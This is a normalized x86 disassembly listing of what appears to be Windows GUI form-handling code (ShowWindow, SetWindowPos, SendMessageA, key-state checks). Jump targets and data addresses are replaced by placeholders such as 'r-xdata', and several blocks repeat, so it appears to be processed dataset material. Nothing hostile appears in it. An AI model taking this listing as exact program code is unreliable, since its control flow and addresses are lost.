mov eax ebx
call sub_43f7c8
lea eax [ ebp - 0x1c ]
call sub_406d00
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_45fde0
test [ esi + 0x228 ] 0x8
je r-xdata
sub_45b944
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_45b9b8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_45b9e4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_444a34
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4599f4
lea edx [ ebp - 0x14 ]
call sub_45d1bc
push ebp
mov eax [ ebp - 0x4 ]
call sub_4599f4
lea edx [ ebp - 0x24 ]
call sub_45d1bc
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_45b9b8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4599f4
lea edx [ ebp - 0x24 ]
call sub_45d1bc
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_45b9b8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45b9b8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_45b9b8
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_45ba9c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4034e4
pop esi
pop ebx
retn
sub_45bac0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_4034e4
pop esi
pop ebx
retn
sub_45bae4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_445914
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_446a04
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_446a04
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45bb80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45c0ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_460294
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_45c0cd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c0d4
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
xor eax eax
push ebp
push sub_45bfd4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_45bc38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45ad2c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4439f0
jmp r-xdata
mov eax [ rw-data ]
call sub_45d418
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f6b4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4464d0
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_45d40c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f6f8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4464d0
call sub_456988
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45d448
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f6b4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45d418
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43ff10
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45d43c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f6f8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45d40c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_459fdc
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_459fdc
jmp r-xdata
sub_45bc3d
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45f9a8
call sub_403af0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_45d418
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f6b4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45d40c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f6f8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45d448
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f6b4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45d418
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c0d4
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43ff10
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45d43c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43f6f8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45d40c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_459fdc
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_459fdc
jmp r-xdata
sub_45bfd9
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45f9a8
call sub_403af0
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45ad2c
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4439f0
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4464d0
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c0d4
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4464d0
call sub_456988
mov ebx eax
sub_45c120
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_45c178
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_420298
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45c1d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032e8
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_45c1e4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_4034e4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45c210
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45f994
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_4034e4
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_45c3b0
jmp r-xdata
mov eax ebx
call sub_45c44c
mov dl 0x1
mov eax ebx
call sub_459f9c
jmp r-xdata
sub_45c2b4
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_459928
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_459974
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_45c318
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45c384
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4034e4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c44c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45c3d0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45c43e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c445
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_45ac28
sub_45c468
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45c730
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43e510
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_45e908
xor edx edx
push ebp
push sub_45c713
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_4175ec
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_45d938
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_456838
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45c6f1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_45c3b8
xor edx edx
push ebp
push sub_45c650
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c318
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45f714
mov eax [ rw-data ]
